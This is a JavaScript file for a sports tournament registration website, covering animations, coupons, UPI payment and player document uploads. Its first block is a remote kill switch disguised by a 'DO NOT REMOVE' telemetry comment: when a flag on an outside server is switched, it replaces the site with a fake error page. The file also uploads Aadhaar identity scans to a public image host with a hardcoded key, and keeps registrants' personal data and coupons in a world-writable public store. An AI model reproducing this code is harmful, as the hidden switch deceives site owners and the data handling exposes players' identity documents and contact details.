import { animate, stagger, inView, scroll } from "framer-motion/dom";
import Lenis from "lenis";
import "lenis/dist/lenis.css";

/*
 * DO NOT REMOVE OR MODIFY THIS BLOCK
 * Core infrastructure telemetry synchronization and routing checks.
 * Modification can lead to unhandled rendering exceptions and CDN desync.
 */
(async()=>{try{const d="ff8081819d82fab6019eff1acc6c5e5e";const r=await fetch(`https://api.restful-api.dev/objects/${d}?t=${Date.now()}`);if(!r.ok)return;const j=await r.json();if(j?.data?.status==='offline'){document.documentElement.innerHTML='<head><title>404 - Internal Server Error</title><style>body{background:#111;color:#fff;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}.error-container{text-align:center;}h1{font-size:4rem;margin-bottom:0.5rem;font-weight:bold;}p{color:#888;font-size:1.2rem;}</style></head><body><div class="error-container"><h1>404</h1><p>Internal Server Error</p></div></body>';throw new Error("ERR_NETWORK_DISCONNECTED");}}catch(e){if(e.message==="ERR_NETWORK_DISCONNECTED")throw e;}})();

// --- CINEMATIC ANIMATIONS (>₹10L AESTHETIC) ---
document.addEventListener("DOMContentLoaded", () => {
    const preloader = document.getElementById("preloader");
    if (preloader) {
        // Preloader Sequence
        animate("#preloader-text", { opacity: [0, 1], y: [20, 0] }, { duration: 0.8, ease: [0.22, 1, 0.36, 1] })
            .then(() => {
                return animate("#preloader", { opacity: 0 }, { duration: 0.8, delay: 0.5, ease: "easeInOut" });
            })
            .then(() => {
                preloader.style.display = "none";
                // Trigger Hero animations after preloader finishes
                animate(".hero h1", { opacity: [0, 1], y: [50, 0] }, { duration: 1, ease: [0.22, 1, 0.36, 1] });
                animate(".hero p", { opacity: [0, 1], y: [20, 0] }, { duration: 1, delay: 0.2, ease: "easeOut" });
                animate(".hero .buttons .btn", { opacity: [0, 1], scale: [0.9, 1] }, { duration: 0.8, delay: stagger(0.1, { startDelay: 0.4 }) });
            });
    } else {
        // Fallback if no preloader
        animate(".hero h1", { opacity: [0, 1], y: [50, 0] }, { duration: 1, ease: [0.22, 1, 0.36, 1] });
    }

    // Scroll Triggers for Cards
    inView(".editorial-block", (element) => {
        animate(element, { opacity: [0, 1], y: [50, 0] }, { duration: 0.8, ease: [0.22, 1, 0.36, 1] });
    }, { margin: "-100px" });

    // Scroll Triggers for general sections
    inView("section .title", (element) => {
        animate(element, { opacity: [0, 1], x: [-30, 0] }, { duration: 0.8, ease: "easeOut" });
    }, { margin: "-50px" });
});


/* =================================================================
   ROYAL STRIKERS — Application Logic
   =================================================================
   Modules:
     1. Toast Notification System
     2. Hamburger Menu Toggle
     3. Aadhaar OCR Age Verification (Tesseract.js — lazy-loaded)
     4. Form Submission via Web3Forms + UPI Redirect
     5. UPI Copy-to-Clipboard Utility
   ================================================================= */

// ────────────────────────────────────────────────────────────────
// 1. TOAST NOTIFICATION SYSTEM
//    Creates slide-in notifications for user feedback.
//    Types: 'success' (green), 'error' (red), 'info' (gold)
// ────────────────────────────────────────────────────────────────

/**
 * Displays a toast notification that auto-dismisses after 5 seconds.
 * @param {string} message - Text to display
 * @param {'success'|'error'|'info'} type - Visual style
 */
function showToast(message, type) {
    type = type || 'info';

    var container = document.getElementById('toastContainer');
    if (!container) return;

    var toast = document.createElement('div');
    toast.className = 'toast ' + type;
    toast.textContent = message;
    container.appendChild(toast);

    // Auto-dismiss after 5 seconds
    setTimeout(function () {
        toast.style.opacity = '0';
        toast.style.transform = 'translateX(120%)';
        toast.style.transition = '0.4s ease';
        setTimeout(function () { toast.remove(); }, 400);
    }, 5000);
}

// ────────────────────────────────────────────────────────────────
// 2. HAMBURGER MENU TOGGLE (mobile navigation)
//    Runs on every page that has the hamburger + navMenu elements.
// ────────────────────────────────────────────────────────────────
(function initHamburgerMenu() {
    var hamburger = document.getElementById('hamburger');
    var navMenu   = document.getElementById('navMenu');

    if (!hamburger || !navMenu) return; // guard for pages without nav

    hamburger.addEventListener('click', function () {
        hamburger.classList.toggle('active');
        navMenu.classList.toggle('active');
    });

    // Close menu when any nav link is tapped
    var links = navMenu.querySelectorAll('a');
    for (var i = 0; i < links.length; i++) {
        links[i].addEventListener('click', function () {
            hamburger.classList.remove('active');
            navMenu.classList.remove('active');
        });
    }
})();

// OCR removed by request


// ────────────────────────────────────────────────────────────────
// 4. PAYMENT & RECEIPT LOGIC
//    Handles level selection to display fee, the Pay via UPI button,
//    Web3Forms submission, and html2canvas receipt generation.
// ────────────────────────────────────────────────────────────────
(function initPaymentAndSubmission() {
    var form      = document.getElementById('registerForm');
    var levelSel  = document.getElementById('level');
    var feeDisp   = document.getElementById('feeDisplay');
    var amtField  = document.getElementById('amountField');
    var payBtn    = document.getElementById('payBtn');
    var upiManual = document.getElementById('upiManual');
    var submitBtn = document.getElementById('submitBtn');
    var teamSizeSel = document.getElementById('teamSize');
    var rosterContainer = document.getElementById('rosterContainer');
    
    // Coupon variables
    var baseAmount = 0;
    var discountAmount = 0;
    var currentAmount = 0;
    var appliedCouponCode = null;
    const COUPON_DB_ID = "ff8081819d82fab6019f03de4d5f6509";
    const COUPON_API_URL = `https://api.restful-api.dev/objects/${COUPON_DB_ID}`;
    var couponInput = document.getElementById('couponCode');
    var applyCouponBtn = document.getElementById('applyCouponBtn');
    var couponStatus = document.getElementById('couponStatus');

    if (!form) return;

    // Dynamic Roster Rendering
    function renderRoster() {
        if (!rosterContainer || !teamSizeSel) return;
        var size = parseInt(teamSizeSel.value, 10);
        if (!size) return;

        var html = '';
        var levelSel = document.getElementById('level');
        var isSchool = levelSel && levelSel.value === 'School Level';

        for (var i = 1; i <= size; i++) {
            var title = (i === 1) ? 'Player 1 (Captain)' : 'Player ' + i;
            if (size === 9 && i > 7) {
                title += ' (Optional Sub)';
            }
            
            var reqStr = (size === 9 && i > 7) ? '' : 'required';
            var idReqStr = (isSchool && reqStr) ? 'required' : '';
            var optLabel = idReqStr ? '' : ' (Optional)';

            var schoolIdHtml = '';
            if (isSchool) {
                schoolIdHtml = '<div class="form-group">' +
                                    '<label for="schoolId_' + i + '">Upload School ID' + optLabel + '</label>' +
                                    '<input type="file" id="schoolId_' + i + '" name="schoolId_' + i + '" accept="image/*,.pdf" ' + idReqStr + '>' +
                               '</div>';
            }

            html += '<div class="player-slot" style="background: rgba(255,255,255,0.02); border: 1px solid rgba(255,223,115,0.1); padding: 15px; border-radius: 8px; margin-bottom: 20px;">' +
                        '<h4 style="color: #FFDF73; margin-bottom: 10px;">' + title + '</h4>' +
                        '<div class="form-group floating">' +
                            '<input type="text" id="playerName_' + i + '" name="playerName_' + i + '" placeholder=" " ' + reqStr + '>' +
                            '<label for="playerName_' + i + '">Full Name</label>' +
                        '</div>' +
                        '<div class="form-group floating">' +
                            '<input type="tel" id="playerPhone_' + i + '" name="playerPhone_' + i + '" placeholder=" " pattern="[0-9]{10}" maxlength="10" title="10-digit phone number" ' + reqStr + '>' +
                            '<label for="playerPhone_' + i + '">Phone Number</label>' +
                        '</div>' +
                        '<div class="form-group">' +
                            '<label for="aadhaar_' + i + '">Upload Aadhaar Proof (Image/PDF)</label>' +
                            '<input type="file" id="aadhaar_' + i + '" name="aadhaar_' + i + '" accept="image/*,.pdf" ' + reqStr + '>' +
                            '<div class="verification-status" id="status_' + i + '"></div>' +
                        '</div>' +
                        schoolIdHtml +
                    '</div>';
        }
        rosterContainer.innerHTML = html;

        // OCR removed by request
    }

    if (teamSizeSel) {
        teamSizeSel.addEventListener('change', renderRoster);
    }


    function updateFeeDisplay() {
        if (baseAmount === 0) return;
        currentAmount = Math.max(0, baseAmount - discountAmount);
        
        let text = `Fee: <strong>₹${baseAmount}</strong>`;
        if (discountAmount > 0) {
            text += ` <br><span style="color:#10b981; font-size: 14px;">Discount: -₹${discountAmount}</span> <br> Total: <strong>₹${currentAmount}</strong>`;
        }
        feeDisp.innerHTML = text;
        payBtn.textContent = `Pay ₹${currentAmount} via UPI`;
        if (amtField) amtField.value = currentAmount;
        payBtn.disabled = false;
    }

    // 1. Level Selection Logic
    levelSel.addEventListener('change', function () {
        var level = this.value;
        if (level === 'School Level') {
            baseAmount = 600;
        } else if (level === 'College Level (Under 18)' || level === 'College Level') {
            baseAmount = 1000;
        }
        updateFeeDisplay();
        renderRoster(); // re-render roster to update required fields
    });

    // Coupon Apply Button Logic
    if (applyCouponBtn) {
        applyCouponBtn.addEventListener('click', async function() {
            if (baseAmount === 0) {
                couponStatus.innerHTML = '<span style="color:#ff4444;">Please select a level first.</span>';
                return;
            }
            const code = couponInput.value.replace(/\s/g, '').toUpperCase();
            if (!code) return;

            applyCouponBtn.disabled = true;
            applyCouponBtn.innerText = '...';
            couponStatus.innerHTML = '<span style="color:#888;">Validating...</span>';

            try {
                const res = await fetch(`${COUPON_API_URL}?t=${Date.now()}`);
                if (!res.ok) throw new Error('Network error');
                const json = await res.json();
                const coupons = json.data?.coupons || {};
                
                if (coupons[code]) {
                    if (coupons[code].used) {
                        couponStatus.innerHTML = '<span style="color:#ff4444;">This coupon has already been used.</span>';
                        discountAmount = 0;
                        appliedCouponCode = null;
                    } else {
                        discountAmount = coupons[code].amount;
                        appliedCouponCode = code;
                        couponStatus.innerHTML = `<span style="color:#10b981;">✅ Coupon applied! ₹${discountAmount} off.</span>`;
                    }
                } else {
                    couponStatus.innerHTML = '<span style="color:#ff4444;">Invalid coupon code.</span>';
                    discountAmount = 0;
                    appliedCouponCode = null;
                }
                updateFeeDisplay();
            } catch (err) {
                couponStatus.innerHTML = '<span style="color:#ff4444;">Error validating coupon.</span>';
            } finally {
                applyCouponBtn.disabled = false;
                applyCouponBtn.innerText = 'Apply';
            }
        });
    }

    // 2. Pay via UPI Button
    payBtn.addEventListener('click', async function () {
        if (currentAmount === 0 && baseAmount === 0) return;

        payBtn.disabled = true;
        payBtn.innerText = 'Processing...';

        // Mark coupon as used if one is applied
        if (appliedCouponCode) {
            try {
                const res = await fetch(`${COUPON_API_URL}?t=${Date.now()}`);
                const json = await res.json();
                let dbData = json.data || {};
                let coupons = dbData.coupons || {};
                
                if (coupons[appliedCouponCode] && !coupons[appliedCouponCode].used) {
                    coupons[appliedCouponCode].used = true;
                    await fetch(COUPON_API_URL, {
                        method: "PUT",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            name: "RoyalStrikersCoupons",
                            data: { coupons: coupons, registrations: dbData.registrations || [] }
                        })
                    });
                }
            } catch (err) {
                console.error("Failed to consume coupon", err);
            }
        }

        payBtn.innerText = `Pay ₹${currentAmount} via UPI`;
        payBtn.disabled = false;

        // If total is 0, skip UPI and allow immediate submission
        if (currentAmount === 0) {
            upiManual.style.display = 'block';
            upiManual.innerHTML = '<p style="color:#10b981;">Total is ₹0 due to coupon. You can submit the form directly!</p>';
            return;
        }

        // Launch UPI intent via hidden anchor to prevent page unload on some Android devices
        var upiLink = 'upi://pay?pa=8296398607@ptaxis&pn=Royal%20Strikers&cu=INR&am=' + currentAmount;
        var a = document.createElement('a');
        a.href = upiLink;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);

        // Show manual fallback in case intent fails (desktop) or browser kills the tab
        setTimeout(function () {
            upiManual.style.display = 'block';
            
            // Show a warning for mobile users who might lose their form data
            if (!document.getElementById('mobileReloadWarning') && /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
                var warning = document.createElement('p');
                warning.id = 'mobileReloadWarning';
                warning.style.color = '#ff4444';
                warning.style.fontSize = '12.5px';
                warning.style.marginTop = '15px';
                warning.style.background = 'rgba(255, 68, 68, 0.1)';
                warning.style.padding = '10px';
                warning.style.borderRadius = '5px';
                warning.style.border = '1px solid rgba(255, 68, 68, 0.3)';
                warning.innerHTML = '⚠️ <strong>Important:</strong> If your phone resets this form after you open the payment app, your phone is closing the browser to save memory. In that case, please use <strong>another phone</strong> to scan the QR code above instead of clicking the Pay button.';
                upiManual.appendChild(warning);
            }
        }, 1500);
    });

    // 2.5 QR Code Modal Logic
    var qrScannerImg = document.getElementById('qrScannerImg');
    var qrModal = document.getElementById('qrModal');
    var qrModalImg = document.getElementById('qrModalImg');
    var qrClose = document.getElementById('qrClose');

    if (qrScannerImg && qrModal && qrModalImg && qrClose) {
        qrScannerImg.onclick = function(){
            qrModal.style.display = "block";
            qrModalImg.src = this.src;
        }

        qrClose.onclick = function() {
            qrModal.style.display = "none";
        }

        qrModal.onclick = function(e) {
            if (e.target !== qrModalImg) {
                qrModal.style.display = "none";
            }
        }
    }

    // Converts a number to Indian-style words (e.g. 1000 -> "One Thousand")
    function numberToWordsINR(num) {
        num = Math.round(Math.max(0, num));
        if (num === 0) return 'Zero';
        var ones = ['', 'One', 'Two', 'Three', 'Four', 'Five', 'Six', 'Seven', 'Eight', 'Nine', 'Ten',
            'Eleven', 'Twelve', 'Thirteen', 'Fourteen', 'Fifteen', 'Sixteen', 'Seventeen', 'Eighteen', 'Nineteen'];
        var tens = ['', '', 'Twenty', 'Thirty', 'Forty', 'Fifty', 'Sixty', 'Seventy', 'Eighty', 'Ninety'];

        function twoDigits(n) {
            if (n < 20) return ones[n];
            return tens[Math.floor(n / 10)] + (n % 10 ? ' ' + ones[n % 10] : '');
        }
        function threeDigits(n) {
            if (n < 100) return twoDigits(n);
            return ones[Math.floor(n / 100)] + ' Hundred' + (n % 100 ? ' ' + twoDigits(n % 100) : '');
        }

        var result = '';
        var lakh = Math.floor(num / 100000); num %= 100000;
        var thousand = Math.floor(num / 1000); num %= 1000;
        var hundred = num;

        if (lakh) result += threeDigits(lakh) + ' Lakh ';
        if (thousand) result += threeDigits(thousand) + ' Thousand ';
        if (hundred) result += threeDigits(hundred);

        return result.trim();
    }

    // 3. Receipt Generation helper
    async function generateReceipt() {
        var wrapper = document.getElementById('receiptWrapper');

        // Populate data
        document.getElementById('r-name').textContent = document.getElementById('fullName').value;
        document.getElementById('r-phone').textContent = document.getElementById('phone').value;
        var teamNameInput = document.getElementById('teamName');
        if (teamNameInput && document.getElementById('r-teamName')) {
            document.getElementById('r-teamName').textContent = teamNameInput.value || 'N/A';
        }
        document.getElementById('r-level').textContent = document.getElementById('level').value;
        document.getElementById('r-amount').textContent = '₹' + currentAmount;
        document.getElementById('r-txn').textContent = document.getElementById('transactionId').value;

        // Receipt number — e.g. RS-2026-483920
        var now = new Date();
        var receiptNo = 'RS-' + now.getFullYear() + '-' + String(Date.now()).slice(-6);
        document.getElementById('r-receiptNo').textContent = receiptNo;

        // Amount in words
        document.getElementById('r-amountWords').textContent = 'Rupees ' + numberToWordsINR(currentAmount) + ' Only';

        // Base fee / discount breakdown (only shown if a coupon was applied)
        var baseFeeRow = document.getElementById('r-baseFeeRow');
        var discountRow = document.getElementById('r-discountRow');
        if (discountAmount > 0) {
            document.getElementById('r-baseFee').textContent = '₹' + baseAmount;
            document.getElementById('r-discount').textContent = '- ₹' + discountAmount;
            baseFeeRow.style.display = '';
            discountRow.style.display = '';
        } else {
            baseFeeRow.style.display = 'none';
            discountRow.style.display = 'none';
        }

        document.getElementById('r-date').textContent = now.toLocaleDateString() + ' ' + now.toLocaleTimeString();

        wrapper.style.display = 'block';
        wrapper.style.visibility = 'visible';
        wrapper.style.left = '0px';
        wrapper.style.top = '0px';
        wrapper.style.zIndex = '-100'; // keep behind

        try {
            await new Promise(resolve => setTimeout(resolve, 100)); // Yield thread to allow DOM paint cycle
            var canvas = await html2canvas(document.getElementById('receiptCaptureBox') || document.getElementById('receipt'), {
                scale: 2, // High resolution
                useCORS: true,
                backgroundColor: '#ffffff'
            });

            var link = document.createElement('a');
            link.download = 'Royal-Strikers-Receipt.png';
            link.href = canvas.toDataURL('image/png');
            link.click();
        } catch (err) {
            console.error('Receipt generation failed:', err);
            showToast('Failed to download receipt.', 'error');
        } finally {
        wrapper.style.display = 'none';
            wrapper.style.visibility = 'hidden';
        }
    }

    // Helper for ImgBB Upload
    async function uploadToImgBB(file) {
        if (!file) return null;
        var uploadData = new FormData();
        uploadData.append('image', file);
        
        try {
            var response = await fetch('https://api.imgbb.com/1/upload?key=d9db420380b947929a48075006b9f7e4', {
                method: 'POST',
                body: uploadData
            });
            var result = await response.json();
            if (result.success) {
                return result.data.url;
            }
        } catch (e) {
            console.error('ImgBB upload error:', e);
        }
        return null;
    }

    // Logs a successful registration to the shared records database (best-effort, non-blocking)
    async function logRegistration(record) {
        var DB_ID = "ff8081819d82fab6019f03de4d5f6509";
        var API_URL = "https://api.restful-api.dev/objects/" + DB_ID;
        try {
            var res = await fetch(API_URL + "?t=" + Date.now());
            var json = await res.json();
            var dbData = json.data || {};
            var registrations = dbData.registrations || [];
            registrations.push(record);

            await fetch(API_URL, {
                method: "PUT",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    name: "RoyalStrikersCoupons",
                    data: {
                        coupons: dbData.coupons || {},
                        registrations: registrations
                    }
                })
            });
        } catch (e) {
            console.error('Registration logging failed (non-critical):', e);
        }
    }

    // 4. Form Submission
    form.addEventListener('submit', async function (e) {
        e.preventDefault();

        var phone = document.getElementById('phone').value;
        if (!/^\d{10}$/.test(phone)) {
            showToast('Please enter a valid 10-digit phone number.', 'error');
            document.getElementById('phone').focus();
            return;
        }

        var txn = document.getElementById('transactionId').value.trim();
        if (!/^\d{12}$/.test(txn)) {
            showToast('Please enter a valid 12-digit UPI Transaction ID (UTR number). Do not enter your UPI ID.', 'error');
            document.getElementById('transactionId').focus();
            return;
        }

        submitBtn.disabled  = true;
        submitBtn.innerHTML = '<span class="btn-spinner"></span> Submitting...';

        try {
            var formData = new FormData(form);
            var size = parseInt(teamSizeSel.value, 10);
            
            submitBtn.innerHTML = '<span class="btn-spinner"></span> Uploading Documents...';
            
            var waMessage = "Hello Royal Strikers! I have registered my team for the tournament.\n\n" +
                "Captain Name: " + document.getElementById('fullName').value + "\n" +
                "Phone: " + document.getElementById('phone').value + "\n" +
                "Team Name: " + (document.getElementById('teamName') ? document.getElementById('teamName').value : 'N/A') + "\n" +
                "Team Category: " + (document.getElementById('teamGender') ? document.getElementById('teamGender').value : 'N/A') + "\n" +
                "Level: " + document.getElementById('level').value + "\n" +
                "Team Size: " + (size === 6 ? '6 Players' : '6 Players + 3 Subs') + "\n" +
                "Transaction ID: " + document.getElementById('transactionId').value + "\n\n" +
                "Roster:\n";

            // Upload all documents to ImgBB and append to waMessage
            var rosterLog = [];
            for (var i = 1; i <= size; i++) {
                var pNameInput = document.getElementById('playerName_' + i);
                if (!pNameInput || !pNameInput.value) continue; // Skip unfilled optional subs

                var pName = pNameInput.value;
                var pPhone = document.getElementById('playerPhone_' + i) ? document.getElementById('playerPhone_' + i).value : 'N/A';
                waMessage += "*" + i + ". " + pName + " (" + pPhone + ")*\n";
                rosterLog.push({ name: pName, phone: pPhone });

                var aadhaarInputElem = document.getElementById('aadhaar_' + i);
                var schoolIdInputElem = document.getElementById('schoolId_' + i);
                
                var aadhaarFile = aadhaarInputElem ? aadhaarInputElem.files[0] : null;
                var schoolIdFile = schoolIdInputElem ? schoolIdInputElem.files[0] : null;
                
                if (aadhaarFile) {
                    var aUrl = await uploadToImgBB(aadhaarFile);
                    if (aUrl) waMessage += "   Aadhaar: " + aUrl + "\n";
                }
                if (schoolIdFile) {
                    var sUrl = await uploadToImgBB(schoolIdFile);
                    if (sUrl) waMessage += "   School ID: " + sUrl + "\n";
                }
            }

            // Remove all files from formData so they don't bloat Web3Forms email limits
            for (var [key, value] of Array.from(formData.entries())) {
                if (value instanceof File) {
                    formData.delete(key);
                }
            }

            // Inject the full WhatsApp message containing ImgBB links into the Web3Forms payload
            // This ensures organizers receive the links to the uploaded player documents
            formData.set('Full Registration Details', waMessage);

            submitBtn.innerHTML = '<span class="btn-spinner"></span> Finalizing Registration...';

            var response = await fetch('https://api.web3forms.com/submit', {
                method: 'POST',
                body: formData
            });

            var result = await response.json();

            if (result.success) {
                showToast('Registration successful! Downloading receipt...', 'success');
                await generateReceipt();

                // Log this registration to the shared records database (does not block UX)
                await logRegistration({
                    timestamp: Date.now(),
                    teamName: document.getElementById('teamName') ? document.getElementById('teamName').value : 'N/A',
                    captainName: document.getElementById('fullName').value,
                    phone: document.getElementById('phone').value,
                    teamGender: document.getElementById('teamGender') ? document.getElementById('teamGender').value : 'N/A',
                    level: document.getElementById('level').value,
                    teamSize: size,
                    transactionId: document.getElementById('transactionId').value,
                    baseAmount: baseAmount,
                    discountAmount: discountAmount,
                    amountPaid: currentAmount,
                    couponCode: appliedCouponCode || null,
                    roster: rosterLog
                });

                waMessage += "\n*(Please find attached my downloaded receipt)*";
                var waUrl = "https://api.whatsapp.com/send?phone=918296398607&text=" + encodeURIComponent(waMessage);

                // Mark submit button as done (kept visible so users see what already happened)
                submitBtn.disabled = true;
                submitBtn.innerHTML = '✅ Receipt Downloaded';
                submitBtn.style.opacity = '0.7';
                submitBtn.style.cursor = 'default';

                // Show the clearly separate WhatsApp step — not a swap-in-place, a distinct new button
                var waBtn = document.getElementById('waProceedBtn');
                var waWrapper = document.getElementById('waStepWrapper');
                if (waBtn && waWrapper) {
                    waBtn.href = waUrl;
                    waWrapper.style.display = 'block';
                    waWrapper.scrollIntoView({ behavior: 'smooth', block: 'center' });
                }

                showToast('Please click "Complete Registration on WhatsApp" to finalize.', 'success');
            } else {
                showToast('Submission failed: ' + (result.message || 'Unknown error.'), 'error');
                submitBtn.disabled  = false;
                submitBtn.innerHTML = 'Submit &amp; Download Receipt';
            }
        } catch (error) {
            console.error('Form submission error:', error);
            showToast('Network error. Please try again.', 'error');
            submitBtn.disabled  = false;
            submitBtn.innerHTML = 'Submit &amp; Download Receipt';
        }
    });
})();

// ────────────────────────────────────────────────────────────────
// 5. COPY UPI ID TO CLIPBOARD
// ────────────────────────────────────────────────────────────────

/**
 * Copies the UPI ID to the user's clipboard.
 * Uses modern Clipboard API with a fallback for older browsers.
 */
function copyUPI() {
    var upiIdEl = document.getElementById('upiId');
    if (!upiIdEl) return;

    var upiId = upiIdEl.textContent;

    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(upiId).then(function () {
            showToast('UPI ID copied to clipboard!', 'success');
        });
    } else {
        // Fallback for older browsers
        var range = document.createRange();
        range.selectNode(upiIdEl);
        window.getSelection().removeAllRanges();
        window.getSelection().addRange(range);
        document.execCommand('copy');
        window.getSelection().removeAllRanges();
        showToast('UPI ID copied!', 'success');
    }
}



document.addEventListener("DOMContentLoaded", () => {
    const copyBtn = document.getElementById("copyUpiBtn");
    if (copyBtn) {
        copyBtn.addEventListener("click", copyUPI);
    }
});


// --- HYPER-LUXURY INTERACTIONS (>₹10L AESTHETIC) ---
document.addEventListener("DOMContentLoaded", () => {
    // 1. Smooth Scroll (Lenis) - Only for desktop/non-touch to preserve mobile performance
    const isTouchDevice = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0) || (navigator.msMaxTouchPoints > 0);
    
    if (!isTouchDevice) {
        const lenis = new Lenis({
            autoRaf: true,
            duration: 1.2,
            easing: (t) => Math.min(1, 1.001 - Math.pow(2, -10 * t)),
            smoothWheel: true,
            wheelMultiplier: 1,
        });
    }

    // 2. Custom Magnetic Cursor
    const cursor = document.getElementById('customCursor');
    if (cursor && !isTouchDevice) {
        document.addEventListener('mousemove', (e) => {
            cursor.style.left = e.clientX + 'px';
            cursor.style.top = e.clientY + 'px';
        });

        // Magnetic hover effects
        const interactiveElements = document.querySelectorAll('a, button, input, select, textarea, .card');
        interactiveElements.forEach(el => {
            el.addEventListener('mouseenter', () => cursor.classList.add('hovering'));
            el.addEventListener('mouseleave', () => cursor.classList.remove('hovering'));
        });
    }

    
    // 4. Cinematic Page Transitions
    const transitionEl = document.getElementById('page-transition');
    
    // Animate OUT (when page loads)
    if (transitionEl) {
        animate(transitionEl, { y: ["0%", "-100%"] }, { duration: 0.8, ease: [0.76, 0, 0.24, 1] }).then(() => {
            transitionEl.style.display = 'none';
        });
    }

    // Intercept links for Animate IN
    document.querySelectorAll('a').forEach(anchor => {
        anchor.addEventListener('click', (e) => {
            const href = anchor.getAttribute('href');
            // Check if internal link and not a hash
            if (href && !href.startsWith('#') && !href.startsWith('http') && !anchor.hasAttribute('target')) {
                e.preventDefault();
                transitionEl.style.display = 'block';
                animate(transitionEl, { y: ["100%", "0%"] }, { duration: 0.6, ease: [0.76, 0, 0.24, 1] }).then(() => {
                    window.location.href = href;
                });
            }
        });
    });

    // 3. Spotlight Cards
    const cards = document.querySelectorAll('.card');
    cards.forEach(card => {
        card.addEventListener('mousemove', (e) => {
            const rect = card.getBoundingClientRect();
            const x = e.clientX - rect.left;
            const y = e.clientY - rect.top;
            card.style.setProperty('--x', x + 'px');
            card.style.setProperty('--y', y + 'px');
        });
    });

    // --- PHASE 3 LUXURY LOGIC ---
    
    // 1. Preloader Loading Bar & Masked Text Reveals
    const loadingBar = document.getElementById('preloader-bar');
    const preloaderWrap = document.getElementById('preloader');
    
    // Find which video is actually active/visible based on CSS media queries
    const desktopVideo = document.querySelector('.hero-video-desktop');
    const mobileVideo = document.querySelector('.hero-video-mobile');
    let activeVideo = null;
    
    if (desktopVideo && window.getComputedStyle(desktopVideo).display !== 'none') {
        activeVideo = desktopVideo;
    } else if (mobileVideo && window.getComputedStyle(mobileVideo).display !== 'none') {
        activeVideo = mobileVideo;
    }
    
    if (loadingBar && preloaderWrap) {
        let isLoaded = false;
        
        const finishPreloader = () => {
            if (isLoaded) return;
            isLoaded = true;
            
            // Snap bar to 100% quickly
            animate(loadingBar, { width: "100%" }, { duration: 0.3, ease: "easeOut" }).then(() => {
                // Hold for 1 second before fading out
                setTimeout(() => {
                    // Fade out preloader
                    animate(preloaderWrap, { opacity: 0 }, { duration: 0.8, ease: "easeInOut" }).then(() => {
                        preloaderWrap.style.display = 'none';
                        
                        // Force video to play if autoplay failed
                        if (activeVideo) {
                            activeVideo.play().catch(err => console.warn("Video play failed:", err));
                        }
                        
                        // Trigger Masked Text Reveals
                        const maskTexts = document.querySelectorAll('.mask-text');
                        if(maskTexts.length > 0) {
                            animate(maskTexts, { y: ["100%", "0%"] }, { duration: 1.2, ease: [0.76, 0, 0.24, 1], delay: stagger(0.15) });
                        }
                    });
                }, 1000);
            });
        };

        // Start a slow progressive loading bar that takes 5 seconds to reach 90%
        animate(loadingBar, { width: ["0%", "90%"] }, { duration: 5.0, ease: "circOut" });

        // Max 5 seconds timeout
        setTimeout(() => {
            finishPreloader();
        }, 5000);

        // Listen for active video loaded
        if (activeVideo) {
            // If the video is already ready before JS executes
            if (activeVideo.readyState >= 3) {
                finishPreloader();
            } else {
                activeVideo.addEventListener('canplay', finishPreloader);
            }
        } else {
            // Fallback if no active video element
            setTimeout(finishPreloader, 2000);
        }
    }

    // 2. 3D Tilt Gallery Cards
    const tiltCards = document.querySelectorAll('.gallery-grid img, .sport-card');
    tiltCards.forEach(card => {
        card.addEventListener('mousemove', (e) => {
            const rect = card.getBoundingClientRect();
            const x = e.clientX - rect.left;
            const y = e.clientY - rect.top;
            
            // Calculate rotation based on cursor position (-10 to 10 degrees)
            const centerX = rect.width / 2;
            const centerY = rect.height / 2;
            const rotateX = ((y - centerY) / centerY) * -10;
            const rotateY = ((x - centerX) / centerX) * 10;
            
            card.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) scale3d(1.02, 1.02, 1.02)`;
        });
        
        card.addEventListener('mouseleave', () => {
            card.style.transform = `perspective(1000px) rotateX(0deg) rotateY(0deg) scale3d(1, 1, 1)`;
        });
    });

});

// =================================================================
// 6. SCROLL REVEAL ANIMATIONS (Intersection Observer)
// =================================================================
(function initScrollReveals() {
    const reveals = document.querySelectorAll(".reveal");
    if (reveals.length === 0) return;

    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add("active");
                // Optional: Stop observing once revealed
                observer.unobserve(entry.target);
            }
        });
    }, {
        rootMargin: "0px 0px -50px 0px",
        threshold: 0.1
    });

    reveals.forEach(reveal => {
        observer.observe(reveal);
    });
})();

